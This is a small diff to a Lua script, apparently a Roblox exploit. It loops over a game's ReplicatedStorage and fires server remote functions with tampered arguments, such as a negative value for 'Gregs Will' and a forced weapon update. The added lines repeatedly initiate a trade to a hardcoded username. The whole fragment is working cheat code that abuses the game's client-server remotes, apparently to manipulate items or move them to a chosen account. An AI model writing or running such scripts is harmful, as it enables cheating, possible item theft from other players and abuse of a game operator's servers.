@@ -8,6 +8,10 @@ for _, v in ReplicatedStorage:GetDescendants() do
 			v:InvokeServer("Gregs Will", -50)
 		elseif v.Name == "UpdateDualWeapon" then
 			v:InvokeServer("Muramusa")
+		elseif v.Name == "Trade" then
+			for i = 1, 2 do
+				v:InvokeServer("InitiateTrade", "xLetmesoloherx")
+			end
 		end
 	elseif v:IsA("RemoteEvent") then
 		-- print(v, "RMEV")
